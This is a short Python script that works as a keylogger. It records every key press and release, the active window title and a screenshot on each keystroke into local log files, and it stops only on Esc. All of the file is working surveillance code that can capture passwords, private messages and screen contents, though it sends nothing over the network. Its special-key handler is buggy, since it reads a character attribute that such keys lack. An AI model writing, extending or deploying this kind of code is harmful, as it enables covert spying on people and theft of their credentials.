import time
from pygetwindow import getActiveWindow
from pynput import keyboard
import logging
import os
import pyautogui

# create directories
log_file = 'log.txt'
log_dir = 'logs'

# if os path for screenshot does not exist make one
screenshot_dir = os.path.join(log_dir, 'screenshots')
if not os.path.exists(screenshot_dir):
    os.makedirs(screenshot_dir)

# create os path for logs
log_path = os.path.join(log_dir, log_file)
if not os.path.exists(log_dir):
    os.makedirs(log_dir)


# capture screen function using pyautogui
def capture_screen():
    try:
        timestamp = time.strftime('%Y-%m-%d_%H-%M-%S')
        screenshot_path = os.path.join(screenshot_dir, f'screenshot_{timestamp}.png')
        screen = pyautogui.screenshot()
        screen.save(screenshot_path)
        print("screen shot has been saved ")
    except Exception as e:
        print(f"Error in capturing : {e}")


# gets the current windows that the keyboard is being used in
def get_active_window():
    try:
        active_window = getActiveWindow()
        if active_window:
            return active_window.title
    except Exception as e:
        print(f'An error occurred getting the window {e}')


print(f"Log directory: {log_dir}")
print(f"Log file path: {log_path}")

# keep note of the order this is filename,level and format
logging.basicConfig(filename=log_path,
                    level=logging.DEBUG, format='%(asctime)s : %(message)s')


# this function handles all keystrokes
def on_press(key):
    try:
        windows = get_active_window()
        logging.info(f'{windows}')
        logging.info(f' alphanumeric key {key.char} pressed')
        capture_screen()

        # for debugging purposes
        print(f'{windows}')
        print(f'alphanumeric key {key.char} pressed')
    except AttributeError:
        logging.info(f'special key {key.char} pressed')
        print(f'special key {key.char} pressed')


# this function handles when any key is released
def on_release(key):
    logging.info('{0} release'.format(key))
    print('{0} release'.format(key))
    if key == keyboard.Key.esc:
        return False


# listen to the keystrokes with the .listener function
with keyboard.Listener(
        on_press=on_press,
        on_release=on_release
) as listener:
    listener.join()
